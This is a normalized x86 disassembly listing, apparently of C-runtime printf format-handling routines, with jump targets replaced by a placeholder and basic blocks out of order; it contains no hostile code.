cmp eax 0x67
jle r-xdata
test al al
jne r-xdata
sub eax 0x5a
je r-xdata
je r-xdata
mov ecx esi
call sub_41f3de
test al al
je r-xdata
xor al al
jmp r-xdata
push ecx
push 0xa
sub eax 0x3
jne r-xdata
mov ecx esi
call sub_423765
jmp r-xdata
cmp eax 0x69
je r-xdata
mov ecx esi
call sub_42315a
jmp r-xdata
sub eax 0x7
je r-xdata
push ebx
cmp eax 0x41
je r-xdata
cmp [ esi + 0x30 ] 0x0
jne r-xdata
mov al bl
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ecx
jmp r-xdata
cmp eax 0x6e
je r-xdata
dec eax
sub eax 0x1
jne r-xdata
mov ecx esi
call sub_42510f
jmp r-xdata
cmp eax 0x43
je r-xdata
mov edx [ esi + 0x20 ]
xor eax eax
push edi
mov [ ebp - 0x4 ] ax
mov edi eax
mov [ ebp - 0x2 ] al
mov eax edx
shr eax 0x4
test bl al
je r-xdata
push 0x10
jmp r-xdata
mov ecx esi
call sub_425fb1
jmp r-xdata
cmp eax 0x6f
jne r-xdata
push ecx
mov ecx esi
call sub_42483f
jmp r-xdata
cmp eax 0x44
jle r-xdata
mov cl [ esi + 0x31 ]
cmp cl 0x78
je r-xdata
mov eax edx
shr eax 0x6
test bl al
je r-xdata
mov ecx esi
call sub_426560
jmp r-xdata
cmp eax 0x47
jle r-xdata
mov eax edx
shr eax 0x5
test bl al
jne r-xdata
cmp cl 0x58
jne r-xdata
test bl dl
je r-xdata
mov [ ebp - 0x4 ] 0x2d
jmp r-xdata
cmp eax 0x53
jne r-xdata
cmp cl 0x61
je r-xdata
xor bl bl
mov eax edx
shr eax 0x1
test bl al
je r-xdata
mov [ ebp - 0x4 ] 0x2b
jmp r-xdata
mov edi ebx
mov al 0x1
cmp cl 0x41
je r-xdata
mov [ ebp - 0x4 ] 0x20
mov [ ebp + edi - 0x4 ] 0x30
cmp cl 0x58
je r-xdata
test al al
je r-xdata
xor al al
jmp r-xdata
mov al 0x1
cmp cl 0x41
je r-xdata
mov ebx [ esi + 0x24 ]
sub ebx [ esi + 0x38 ]
sub ebx edi
test dl 0xc
jne r-xdata
test bl bl
jne r-xdata
push [ esi + 0xc ]
lea eax [ esi + 0x18 ]
push eax
push edi
lea eax [ ebp - 0x4 ]
lea ecx [ esi + 0x448 ]
push eax
call sub_4289e4
mov ecx [ esi + 0x20 ]
lea edi [ esi + 0x18 ]
mov eax ecx
shr eax 0x3
test al 0x1
je r-xdata
lea eax [ esi + 0x18 ]
push eax
push ebx
lea eax [ esi + 0x448 ]
push 0x20
push eax
call sub_41c4b3
add esp 0x10
xor al al
jmp r-xdata
push 0x0
mov ecx esi
call sub_42835f
cmp [ edi ] 0x0
jl r-xdata
shr ecx 0x2
test cl 0x1
jne r-xdata
test al al
sete al
dec al
and al 0xe0
add al 0x78
mov [ ebp + edi - 0x3 ] al
add edi 0x2
mov al 0x1
pop edi
mov eax [ esi + 0x20 ]
shr eax 0x2
test al 0x1
je r-xdata
push edi
push ebx
lea eax [ esi + 0x448 ]
push 0x30
push eax
call sub_41c4b3
add esp 0x10
push edi
push ebx
lea eax [ esi + 0x448 ]
push 0x20
push eax
call sub_41c4b3
add esp 0x10
sub_421661
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
xor ebx ebx
inc ebx
xor ecx ecx
movsx eax [ esi + 0x31 ]
cmp eax 0x64
jg r-xdata
cmp eax 0x70
jg r-xdata
je r-xdata
sub eax 0x73
je r-xdata
je r-xdata
or [ esi + 0x20 ] 0x10
cmp eax 0x58
jg r-xdata
mov ecx esi
call sub_4268c4
dec eax
sub eax 0x1
je r-xdata
mov ecx esi
call sub_4266e5
jmp r-xdata
cmp eax 0x67
jle r-xdata
test al al
jne r-xdata
sub eax 0x5a
je r-xdata
je r-xdata
cmp [ esi + 0x30 ] 0x0
je r-xdata
xor al al
jmp r-xdata
push ecx
push 0xa
sub eax 0x3
jne r-xdata
mov ecx esi
call sub_4238de
jmp r-xdata
cmp eax 0x69
je r-xdata
mov ecx esi
call sub_4231d9
jmp r-xdata
sub eax 0x7
je r-xdata
push ebx
cmp eax 0x41
je r-xdata
mov edx [ esi + 0x20 ]
xor eax eax
push edi
mov [ ebp - 0x4 ] ax
mov edi eax
mov [ ebp - 0x2 ] al
mov eax edx
shr eax 0x4
test bl al
je r-xdata
mov al bl
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ecx
jmp r-xdata
cmp eax 0x6e
je r-xdata
dec eax
sub eax 0x1
jne r-xdata
mov ecx esi
call sub_425275
jmp r-xdata
cmp eax 0x43
je r-xdata
mov cl [ esi + 0x31 ]
cmp cl 0x78
je r-xdata
mov eax edx
shr eax 0x6
test bl al
je r-xdata
push 0x10
jmp r-xdata
mov ecx esi
call sub_42604a
jmp r-xdata
cmp eax 0x6f
jne r-xdata
push ecx
mov ecx esi
call sub_4248ff
jmp r-xdata
cmp eax 0x44
jle r-xdata
mov eax edx
shr eax 0x5
test bl al
jne r-xdata
cmp cl 0x58
jne r-xdata
test bl dl
je r-xdata
mov [ ebp - 0x4 ] 0x2d
jmp r-xdata
mov ecx esi
call sub_42657f
jmp r-xdata
cmp eax 0x47
jle r-xdata
cmp cl 0x61
je r-xdata
xor bl bl
mov eax edx
shr eax 0x1
test bl al
je r-xdata
mov [ ebp - 0x4 ] 0x2b
jmp r-xdata
mov edi ebx
cmp eax 0x53
jne r-xdata
mov al 0x1
cmp cl 0x41
je r-xdata
mov [ ebp - 0x4 ] 0x20
mov [ ebp + edi - 0x4 ] 0x30
cmp cl 0x58
je r-xdata
test al al
je r-xdata
xor al al
jmp r-xdata
mov al 0x1
cmp cl 0x41
je r-xdata
mov ebx [ esi + 0x24 ]
sub ebx [ esi + 0x38 ]
sub ebx edi
test dl 0xc
jne r-xdata
test bl bl
jne r-xdata
push [ esi + 0xc ]
lea eax [ esi + 0x18 ]
push eax
push edi
lea eax [ ebp - 0x4 ]
lea ecx [ esi + 0x448 ]
push eax
call sub_4289e4
mov ecx [ esi + 0x20 ]
lea edi [ esi + 0x18 ]
mov eax ecx
shr eax 0x3
test al 0x1
je r-xdata
lea eax [ esi + 0x18 ]
push eax
push ebx
lea eax [ esi + 0x448 ]
push 0x20
push eax
call sub_41c4b3
add esp 0x10
xor al al
jmp r-xdata
push 0x0
mov ecx esi
call sub_428406
cmp [ edi ] 0x0
jl r-xdata
shr ecx 0x2
test cl 0x1
jne r-xdata
test al al
sete al
dec al
and al 0xe0
add al 0x78
mov [ ebp + edi - 0x3 ] al
add edi 0x2
mov al 0x1
pop edi
mov eax [ esi + 0x20 ]
shr eax 0x2
test al 0x1
je r-xdata
push edi
push ebx
lea eax [ esi + 0x448 ]
push 0x30
push eax
call sub_41c4b3
add esp 0x10
push edi
push ebx
lea eax [ esi + 0x448 ]
push 0x20
push eax
call sub_41c4b3
add esp 0x10
sub_421890
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
xor ebx ebx
inc ebx
xor ecx ecx
movsx eax [ esi + 0x31 ]
cmp eax 0x64
jg r-xdata
cmp eax 0x70
jg r-xdata
je r-xdata
sub eax 0x73
je r-xdata
je r-xdata
or [ esi + 0x20 ] 0x10
cmp eax 0x58
jg r-xdata
mov ecx esi
call sub_426937
dec eax
sub eax 0x1
je r-xdata
mov ecx esi
call sub_4266fd
jmp r-xdata
cmp eax 0x67
jle r-xdata
test al al
jne r-xdata
sub eax 0x5a
je r-xdata
je r-xdata
cmp [ esi + 0x30 ] 0x0
je r-xdata
xor al al
jmp r-xdata
push ecx
push 0xa
sub eax 0x3
jne r-xdata
mov ecx esi
call sub_423a38
jmp r-xdata
cmp eax 0x69
je r-xdata
mov ecx esi
call sub_42323c
jmp r-xdata
sub eax 0x7
je r-xdata
push ebx
cmp eax 0x41
je r-xdata
mov edx [ esi + 0x20 ]
xor eax eax
push edi
mov [ ebp - 0x4 ] ax
mov edi eax
mov [ ebp - 0x2 ] al
mov eax edx
shr eax 0x4
test bl al
je r-xdata
mov al bl
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ecx
jmp r-xdata
cmp eax 0x6e
je r-xdata
dec eax
sub eax 0x1
jne r-xdata
mov ecx esi
call sub_4253af
jmp r-xdata
cmp eax 0x43
je r-xdata
mov cl [ esi + 0x31 ]
cmp cl 0x78
je r-xdata
mov eax edx
shr eax 0x6
test bl al
je r-xdata
push 0x10
jmp r-xdata
mov ecx esi
call sub_4260be
jmp r-xdata
cmp eax 0x6f
jne r-xdata
push ecx
mov ecx esi
call sub_42498f
jmp r-xdata
cmp eax 0x44
jle r-xdata
mov eax edx
shr eax 0x5
test bl al
jne r-xdata
cmp cl 0x58
jne r-xdata
test bl dl
je r-xdata
mov [ ebp - 0x4 ] 0x2d
jmp r-xdata
mov ecx esi
call sub_42659e
jmp r-xdata
cmp eax 0x47
jle r-xdata
cmp cl 0x61
je r-xdata
xor bl bl
mov eax edx
shr eax 0x1
test bl al
je r-xdata
mov [ ebp - 0x4 ] 0x2b
jmp r-xdata
mov edi ebx
cmp eax 0x53
jne r-xdata
mov al 0x1
cmp cl 0x41
je r-xdata
mov [ ebp - 0x4 ] 0x20
mov [ ebp + edi - 0x4 ] 0x30
cmp cl 0x58
je r-xdata
test al al
je r-xdata
xor al al
jmp r-xdata
mov al 0x1
cmp cl 0x41
je r-xdata
mov ebx [ esi + 0x24 ]
sub ebx [ esi + 0x38 ]
sub ebx edi
test dl 0xc
jne r-xdata
test bl bl
jne r-xdata
push [ esi + 0xc ]
lea eax [ esi + 0x18 ]
push eax
push edi
lea eax [ ebp - 0x4 ]
lea ecx [ esi + 0x448 ]
push eax
call sub_428afb
mov ecx [ esi + 0x20 ]
lea edi [ esi + 0x18 ]
mov eax ecx
shr eax 0x3
test al 0x1
je r-xdata
lea eax [ esi + 0x18 ]
push eax
push ebx
lea eax [ esi + 0x448 ]
push 0x20
push eax
call sub_41c510
add esp 0x10
xor al al
jmp r-xdata
push 0x0
mov ecx esi
call sub_4284ad
cmp [ edi ] 0x0
jl r-xdata
shr ecx 0x2
test cl 0x1
jne r-xdata
test al al
sete al
dec al
and al 0xe0
add al 0x78
mov [ ebp + edi - 0x3 ] al
add edi 0x2
mov al 0x1
pop edi
mov eax [ esi + 0x20 ]
shr eax 0x2
test al 0x1
je r-xdata
push edi
push ebx
lea eax [ esi + 0x448 ]
push 0x30
push eax
call sub_41c510
add esp 0x10
push edi
push ebx
lea eax [ esi + 0x448 ]
push 0x20
push eax
call sub_41c510
add esp 0x10
sub_421abf
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
xor ebx ebx
inc ebx
xor ecx ecx
movsx eax [ esi + 0x31 ]
cmp eax 0x64
jg r-xdata
cmp eax 0x70
jg r-xdata
je r-xdata
sub eax 0x73
je r-xdata
je r-xdata
or [ esi + 0x20 ] 0x10
cmp eax 0x58
jg r-xdata
mov ecx esi
call sub_4269aa
dec eax
sub eax 0x1
je r-xdata
mov ecx esi
call sub_426715
jmp r-xdata
cmp eax 0x67
jle r-xdata
test al al
jne r-xdata
sub eax 0x5a
je r-xdata
je r-xdata
mov ecx esi
call sub_41f3f5
test al al
je r-xdata
xor al al
jmp r-xdata
push ecx
push 0xa
sub eax 0x3
jne r-xdata
mov ecx esi
call sub_423b92
jmp r-xdata
cmp eax 0x69
je r-xdata
mov ecx esi
call sub_42329f
jmp r-xdata
sub eax 0x7
je r-xdata
push ebx
cmp eax 0x41
je r-xdata
cmp [ esi + 0x30 ] 0x0
jne r-xdata
mov al bl
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ecx
jmp r-xdata
cmp eax 0x6e
je r-xdata
dec eax
sub eax 0x1
jne r-xdata
mov ecx esi
call sub_4254e9
jmp r-xdata
cmp eax 0x43
je r-xdata
mov edx [ esi + 0x20 ]
xor eax eax
push edi
mov [ ebp - 0x4 ] ax
mov edi eax
mov [ ebp - 0x2 ] al
mov eax edx
shr eax 0x4
test bl al
je r-xdata
push 0x10
jmp r-xdata
mov ecx esi
call sub_426132
jmp r-xdata
cmp eax 0x6f
jne r-xdata
push ecx
mov ecx esi
call sub_424a1f
jmp r-xdata
cmp eax 0x44
jle r-xdata
mov cl [ esi + 0x31 ]
cmp cl 0x78
je r-xdata
mov eax edx
shr eax 0x6
test bl al
je r-xdata
mov ecx esi
call sub_4265bd
jmp r-xdata
cmp eax 0x47
jle r-xdata
mov eax edx
shr eax 0x5
test bl al
jne r-xdata
cmp cl 0x58
jne r-xdata
test bl dl
je r-xdata
mov [ ebp - 0x4 ] 0x2d
jmp r-xdata
cmp eax 0x53
jne r-xdata
cmp cl 0x61
je r-xdata
xor bl bl
mov eax edx
shr eax 0x1
test bl al
je r-xdata
mov [ ebp - 0x4 ] 0x2b
jmp r-xdata
mov edi ebx
mov al 0x1
cmp cl 0x41
je r-xdata
mov [ ebp - 0x4 ] 0x20
mov [ ebp + edi - 0x4 ] 0x30
cmp cl 0x58
je r-xdata
test al al
je r-xdata
xor al al
jmp r-xdata
mov al 0x1
cmp cl 0x41
je r-xdata
mov ebx [ esi + 0x24 ]
sub ebx [ esi + 0x38 ]
sub ebx edi
test dl 0xc
jne r-xdata
test bl bl
jne r-xdata
push [ esi + 0xc ]
lea eax [ esi + 0x18 ]
push eax
push edi
lea eax [ ebp - 0x4 ]
lea ecx [ esi + 0x448 ]
push eax
call sub_428afb
mov ecx [ esi + 0x20 ]
lea edi [ esi + 0x18 ]
mov eax ecx
shr eax 0x3
test al 0x1
je r-xdata
lea eax [ esi + 0x18 ]
push eax
push ebx
lea eax [ esi + 0x448 ]
push 0x20
push eax
call sub_41c510
add esp 0x10
xor al al
jmp r-xdata
push 0x0
mov ecx esi
call sub_428554
cmp [ edi ] 0x0
jl r-xdata
shr ecx 0x2
test cl 0x1
jne r-xdata
test al al
sete al
dec al
and al 0xe0
add al 0x78
mov [ ebp + edi - 0x3 ] al
add edi 0x2
mov al 0x1
pop edi
mov eax [ esi + 0x20 ]
shr eax 0x2
test al 0x1
je r-xdata
push edi
push ebx
lea eax [ esi + 0x448 ]
push 0x30
push eax
call sub_41c510
add esp 0x10
push edi
push ebx
lea eax [ esi + 0x448 ]
push 0x20
push eax
call sub_41c510
add esp 0x10
sub_421cf9
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
xor ebx ebx
inc ebx
xor ecx ecx
movsx eax [ esi + 0x31 ]
cmp eax 0x64
jg r-xdata
cmp eax 0x70
jg r-xdata
je r-xdata
sub eax 0x73
je r-xdata
je r-xdata
or [ esi + 0x20 ] 0x10
cmp eax 0x58
jg r-xdata
mov ecx esi
call sub_426a26
dec eax
sub eax 0x1
je r-xdata
mov ecx esi
call sub_42672d
jmp r-xdata
cmp eax 0x67
jle r-xdata
test al al
jne r-xdata
sub eax 0x5a
je r-xdata
je r-xdata
cmp [ esi + 0x30 ] 0x0
je r-xdata
xor al al
jmp r-xdata
push ecx
push 0xa
sub eax 0x3
jne r-xdata
mov ecx esi
call sub_423d0b
jmp r-xdata
cmp eax 0x69
je r-xdata
mov ecx esi
call sub_42331e
jmp r-xdata
sub eax 0x7
je r-xdata
push ebx
cmp eax 0x41
je r-xdata
mov edx [ esi + 0x20 ]
xor eax eax
push edi
mov [ ebp - 0x4 ] ax
mov edi eax
mov [ ebp - 0x2 ] al
mov eax edx
shr eax 0x4
test bl al
je r-xdata
mov al bl
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ecx
jmp r-xdata
cmp eax 0x6e
je r-xdata
dec eax
sub eax 0x1
jne r-xdata
mov ecx esi
call sub_42564f
jmp r-xdata
cmp eax 0x43
je r-xdata
mov cl [ esi + 0x31 ]
cmp cl 0x78
je r-xdata
mov eax edx
shr eax 0x6
test bl al
je r-xdata
push 0x10
jmp r-xdata
mov ecx esi
call sub_4261cb
jmp r-xdata
cmp eax 0x6f
jne r-xdata
push ecx
mov ecx esi
call sub_424adf
jmp r-xdata
cmp eax 0x44
jle r-xdata
mov eax edx
shr eax 0x5
test bl al
jne r-xdata
cmp cl 0x58
jne r-xdata
test bl dl
je r-xdata
mov [ ebp - 0x4 ] 0x2d
jmp r-xdata
mov ecx esi
call sub_4265dc
jmp r-xdata
cmp eax 0x47
jle r-xdata
cmp cl 0x61
je r-xdata
xor bl bl
mov eax edx
shr eax 0x1
test bl al
je r-xdata
mov [ ebp - 0x4 ] 0x2b
jmp r-xdata
mov edi ebx
cmp eax 0x53
jne r-xdata
mov al 0x1
cmp cl 0x41
je r-xdata
mov [ ebp - 0x4 ] 0x20
mov [ ebp + edi - 0x4 ] 0x30
cmp cl 0x58
je r-xdata
test al al
je r-xdata
xor al al
jmp r-xdata
mov al 0x1
cmp cl 0x41
je r-xdata
mov ebx [ esi + 0x24 ]
sub ebx [ esi + 0x38 ]
sub ebx edi
test dl 0xc
jne r-xdata
test bl bl
jne r-xdata
push [ esi + 0xc ]
lea eax [ esi + 0x18 ]
push eax
push edi
lea eax [ ebp - 0x4 ]
lea ecx [ esi + 0x448 ]
push eax
call sub_428afb
mov ecx [ esi + 0x20 ]
lea edi [ esi + 0x18 ]
mov eax ecx
shr eax 0x3
test al 0x1
je r-xdata
lea eax [ esi + 0x18 ]
push eax
push ebx
lea eax [ esi + 0x448 ]
push 0x20
push eax
call sub_41c510
add esp 0x10
xor al al
jmp r-xdata
push 0x0
mov ecx esi
call sub_4285fb
cmp [ edi ] 0x0
jl r-xdata
shr ecx 0x2
test cl 0x1
jne r-xdata
test al al
sete al
dec al
and al 0xe0
add al 0x78
mov [ ebp + edi - 0x3 ] al
add edi 0x2
mov al 0x1
pop edi
mov eax [ esi + 0x20 ]
shr eax 0x2
test al 0x1
je r-xdata
push edi
push ebx
lea eax [ esi + 0x448 ]
push 0x30
push eax
call sub_41c510
add esp 0x10
push edi
push ebx
lea eax [ esi + 0x448 ]
push 0x20
push eax
call sub_41c510
add esp 0x10
sub_421f28
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi ecx
xor ebx ebx
push 0x41
pop edx
push 0x58
movzx eax [ esi + 0x32 ]
pop ecx
cmp eax 0x64
jg r-xdata
cmp eax 0x70
jg r-xdata
je r-xdata
sub eax 0x73
je r-xdata
je r-xdata
or [ esi + 0x20 ] 0x10
cmp eax ecx
jg r-xdata
mov ecx esi
call sub_426a99
dec eax
sub eax 0x1
je r-xdata
mov ecx esi
call sub_426745
jmp r-xdata
cmp eax 0x67
jle r-xdata
test al al
jne r-xdata
sub eax 0x5a
je r-xdata
je r-xdata
cmp [ esi + 0x30 ] bl
jne r-xdata
xor al al
jmp r-xdata
push ebx
push 0xa
sub eax 0x3
jne r-xdata
mov ecx esi
call sub_423e65
jmp r-xdata
cmp eax 0x69
je r-xdata
mov ecx esi
call sub_423381
jmp r-xdata
sub eax 0x7
je r-xdata
push 0x1
cmp eax edx
je r-xdata
mov al 0x1
mov edx [ esi + 0x20 ]
xor ecx ecx
push edi
mov eax edx
mov [ ebp - 0xc ] ebx
shr eax 0x4
inc ecx
mov [ ebp - 0x8 ] bx
push 0x20
pop edi
test cl al
je r-xdata
mov ecx [ ebp - 0x4 ]
pop esi
xor ecx ebp
pop ebx
call sub_40c3ae
mov esp ebp
pop ebp
retn
push ebx
jmp r-xdata
cmp eax 0x6e
je r-xdata
dec eax
sub eax 0x1
jne r-xdata
mov ecx esi
call sub_425789
jmp r-xdata
cmp eax 0x43
je r-xdata
movzx ecx [ esi + 0x32 ]
cmp ecx 0x78
je r-xdata
mov eax edx
shr eax 0x6
test cl al
je r-xdata
push 0x10
jmp r-xdata
mov ecx esi
call sub_42623f
jmp r-xdata
cmp eax 0x6f
jne r-xdata
push ebx
mov ecx esi
call sub_424b6f
jmp r-xdata
cmp eax 0x44
jle r-xdata
mov eax edx
shr eax 0x5
test al 0x1
je r-xdata
push 0x58
pop eax
cmp cx ax
jne r-xdata
test cl dl
je r-xdata
push 0x2d
mov ecx esi
call sub_4265fb
jmp r-xdata
cmp eax 0x47
jle r-xdata
xor ah ah
mov ah 0x1
jmp r-xdata
mov eax edx
shr eax 0x1
test cl al
je r-xdata
push 0x2b
jmp r-xdata
mov ebx ecx
cmp eax 0x53
jne r-xdata
mov al 0x1
push 0x41
pop edi
cmp cx di
je r-xdata
cmp ecx 0x61
je r-xdata
mov [ ebp - 0xc ] di
pop eax
mov [ ebp - 0xc ] ax
jmp r-xdata
push 0x58
pop eax
mov [ ebp + ebx * 2 - 0xc ] di
cmp cx ax
je r-xdata
test al al
je r-xdata
xor al al
jmp r-xdata
mov al 0x1
push 0x41
pop eax
cmp cx ax
je r-xdata
mov edi [ esi + 0x24 ]
sub edi [ esi + 0x38 ]
sub edi ebx
test dl 0xc
jne r-xdata
push 0x30
pop edi
test ah ah
jne r-xdata
push [ esi + 0xc ]
lea eax [ esi + 0x18 ]
push eax
push ebx
lea eax [ ebp - 0xc ]
lea ecx [ esi + 0x448 ]
push eax
call sub_428a6e
mov ecx [ esi + 0x20 ]
lea ebx [ esi + 0x18 ]
mov eax ecx
shr eax 0x3
test al 0x1
je r-xdata
lea eax [ esi + 0x18 ]
push eax
push edi
lea eax [ esi + 0x448 ]
push 0x20
push eax
call sub_41c4df
add esp 0x10
xor al al
jmp r-xdata
push 0x0
mov ecx esi
call sub_4286a2
cmp [ ebx ] 0x0
jl r-xdata
shr ecx 0x2
test cl 0x1
jne r-xdata
test al al
sete al
dec al
and al 0xe0
add al 0x78
cbw
mov [ ebp + ebx * 2 - 0xa ] ax
add ebx 0x2
pop edi
mov eax [ esi + 0x20 ]
shr eax 0x2
test al 0x1
je r-xdata
push ebx
push edi
lea eax [ esi + 0x448 ]
push 0x30
push eax
call sub_41c4df
add esp 0x10
push ebx
push edi
lea eax [ esi + 0x448 ]
push 0x20
push eax
call sub_41c4df
add esp 0x10
sub_422185
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi ecx
xor ebx ebx
push 0x41
pop edx
push 0x58
movzx eax [ esi + 0x32 ]
pop ecx
cmp eax 0x64
jg r-xdata
cmp eax 0x70
jg r-xdata
je r-xdata
sub eax 0x73
je r-xdata
je r-xdata
or [ esi + 0x20 ] 0x10
cmp eax ecx
jg r-xdata
mov ecx esi
call sub_426b0d
dec eax
sub eax 0x1
je r-xdata
mov ecx esi
call sub_42675d
jmp r-xdata
cmp eax 0x67
jle r-xdata
test al al
jne r-xdata
sub eax 0x5a
je r-xdata
je r-xdata
mov ecx esi
call sub_41f40c
test al al
jne r-xdata
xor al al
jmp r-xdata
push ebx
push 0xa
sub eax 0x3
jne r-xdata
mov ecx esi
call sub_423fd7
jmp r-xdata
cmp eax 0x69
je r-xdata
mov ecx esi
call sub_4233e4
jmp r-xdata
sub eax 0x7
je r-xdata
push 0x1
cmp eax edx
je r-xdata
mov al 0x1
cmp [ esi + 0x30 ] bl
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop esi
xor ecx ebp
pop ebx
call sub_40c3ae
mov esp ebp
pop ebp
retn
push ebx
jmp r-xdata
cmp eax 0x6e
je r-xdata
dec eax
sub eax 0x1
jne r-xdata
mov ecx esi
call sub_4258c3
jmp r-xdata
cmp eax 0x43
je r-xdata
mov edx [ esi + 0x20 ]
xor ecx ecx
push edi
mov eax edx
mov [ ebp - 0xc ] ebx
shr eax 0x4
inc ecx
mov [ ebp - 0x8 ] bx
push 0x20
pop edi
test cl al
je r-xdata
push 0x10
jmp r-xdata
mov ecx esi
call sub_4262b3
jmp r-xdata
cmp eax 0x6f
jne r-xdata
push ebx
mov ecx esi
call sub_424c07
jmp r-xdata
cmp eax 0x44
jle r-xdata
movzx ecx [ esi + 0x32 ]
cmp ecx 0x78
je r-xdata
mov eax edx
shr eax 0x6
test cl al
je r-xdata
mov ecx esi
call sub_42661a
jmp r-xdata
cmp eax 0x47
jle r-xdata
mov eax edx
shr eax 0x5
test al 0x1
je r-xdata
push 0x58
pop eax
cmp cx ax
jne r-xdata
test cl dl
je r-xdata
push 0x2d
cmp eax 0x53
jne r-xdata
xor ah ah
mov ah 0x1
jmp r-xdata
mov eax edx
shr eax 0x1
test cl al
je r-xdata
push 0x2b
jmp r-xdata
mov ebx ecx
mov al 0x1
push 0x41
pop edi
cmp cx di
je r-xdata
cmp ecx 0x61
je r-xdata
mov [ ebp - 0xc ] di
pop eax
mov [ ebp - 0xc ] ax
jmp r-xdata
push 0x58
pop eax
mov [ ebp + ebx * 2 - 0xc ] di
cmp cx ax
je r-xdata
test al al
je r-xdata
xor al al
jmp r-xdata
mov al 0x1
push 0x41
pop eax
cmp cx ax
je r-xdata
mov edi [ esi + 0x24 ]
sub edi [ esi + 0x38 ]
sub edi ebx
test dl 0xc
jne r-xdata
push 0x30
pop edi
test ah ah
jne r-xdata
push [ esi + 0xc ]
lea eax [ esi + 0x18 ]
push eax
push ebx
lea eax [ ebp - 0xc ]
lea ecx [ esi + 0x448 ]
push eax
call sub_428a6e
mov ecx [ esi + 0x20 ]
lea ebx [ esi + 0x18 ]
mov eax ecx
shr eax 0x3
test al 0x1
je r-xdata
lea eax [ esi + 0x18 ]
push eax
push edi
lea eax [ esi + 0x448 ]
push 0x20
push eax
call sub_41c4df
add esp 0x10
xor al al
jmp r-xdata
push 0x0
mov ecx esi
call sub_42872d
cmp [ ebx ] 0x0
jl r-xdata
shr ecx 0x2
test cl 0x1
jne r-xdata
test al al
sete al
dec al
and al 0xe0
add al 0x78
cbw
mov [ ebp + ebx * 2 - 0xa ] ax
add ebx 0x2
pop edi
mov eax [ esi + 0x20 ]
shr eax 0x2
test al 0x1
je r-xdata
push ebx
push edi
lea eax [ esi + 0x448 ]
push 0x30
push eax
call sub_41c4df
add esp 0x10
push ebx
push edi
lea eax [ esi + 0x448 ]
push 0x20
push eax
call sub_41c4df
add esp 0x10
sub_4223f1
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi ecx
xor ebx ebx
push 0x41
pop edx
push 0x58
movzx eax [ esi + 0x32 ]
pop ecx
cmp eax 0x64
jg r-xdata
cmp eax 0x70
jg r-xdata
je r-xdata
sub eax 0x73
je r-xdata
je r-xdata
or [ esi + 0x20 ] 0x10
cmp eax ecx
jg r-xdata
mov ecx esi
call sub_426b8b
dec eax
sub eax 0x1
je r-xdata
mov ecx esi
call sub_426775
jmp r-xdata
cmp eax 0x67
jle r-xdata
test al al
jne r-xdata
sub eax 0x5a
je r-xdata
je r-xdata
cmp [ esi + 0x30 ] bl
jne r-xdata
xor al al
jmp r-xdata
push ebx
push 0xa
sub eax 0x3
jne r-xdata
mov ecx esi
call sub_424168
jmp r-xdata
cmp eax 0x69
je r-xdata
mov ecx esi
call sub_423463
jmp r-xdata
sub eax 0x7
je r-xdata
push 0x1
cmp eax edx
je r-xdata
mov al 0x1
mov edx [ esi + 0x20 ]
xor ecx ecx
push edi
mov eax edx
mov [ ebp - 0xc ] ebx
shr eax 0x4
inc ecx
mov [ ebp - 0x8 ] bx
push 0x20
pop edi
test cl al
je r-xdata
mov ecx [ ebp - 0x4 ]
pop esi
xor ecx ebp
pop ebx
call sub_40c3ae
mov esp ebp
pop ebp
retn
push ebx
jmp r-xdata
cmp eax 0x6e
je r-xdata
dec eax
sub eax 0x1
jne r-xdata
mov ecx esi
call sub_425a29
jmp r-xdata
cmp eax 0x43
je r-xdata
movzx ecx [ esi + 0x32 ]
cmp ecx 0x78
je r-xdata
mov eax edx
shr eax 0x6
test cl al
je r-xdata
push 0x10
jmp r-xdata
mov ecx esi
call sub_42634c
jmp r-xdata
cmp eax 0x6f
jne r-xdata
push ebx
mov ecx esi
call sub_424cb6
jmp r-xdata
cmp eax 0x44
jle r-xdata
mov eax edx
shr eax 0x5
test al 0x1
je r-xdata
push 0x58
pop eax
cmp cx ax
jne r-xdata
test cl dl
je r-xdata
push 0x2d
mov ecx esi
call sub_426639
jmp r-xdata
cmp eax 0x47
jle r-xdata
xor ah ah
mov ah 0x1
jmp r-xdata
mov eax edx
shr eax 0x1
test cl al
je r-xdata
push 0x2b
jmp r-xdata
mov ebx ecx
cmp eax 0x53
jne r-xdata
mov al 0x1
push 0x41
pop edi
cmp cx di
je r-xdata
cmp ecx 0x61
je r-xdata
mov [ ebp - 0xc ] di
pop eax
mov [ ebp - 0xc ] ax
jmp r-xdata
push 0x58
pop eax
mov [ ebp + ebx * 2 - 0xc ] di
cmp cx ax
je r-xdata
test al al
je r-xdata
xor al al
jmp r-xdata
mov al 0x1
push 0x41
pop eax
cmp cx ax
je r-xdata
mov edi [ esi + 0x24 ]
sub edi [ esi + 0x38 ]
sub edi ebx
test dl 0xc
jne r-xdata
push 0x30
pop edi
test ah ah
jne r-xdata
push [ esi + 0xc ]
lea eax [ esi + 0x18 ]
push eax
push ebx
lea eax [ ebp - 0xc ]
lea ecx [ esi + 0x448 ]
push eax
call sub_428a6e
mov ecx [ esi + 0x20 ]
lea ebx [ esi + 0x18 ]
mov eax ecx
shr eax 0x3
test al 0x1
je r-xdata
lea eax [ esi + 0x18 ]
push eax
push edi
lea eax [ esi + 0x448 ]
push 0x20
push eax
call sub_41c4df
add esp 0x10
xor al al
jmp r-xdata
push 0x0
mov ecx esi
call sub_4287b8
cmp [ ebx ] 0x0
jl r-xdata
shr ecx 0x2
test cl 0x1
jne r-xdata
test al al
sete al
dec al
and al 0xe0
add al 0x78
cbw
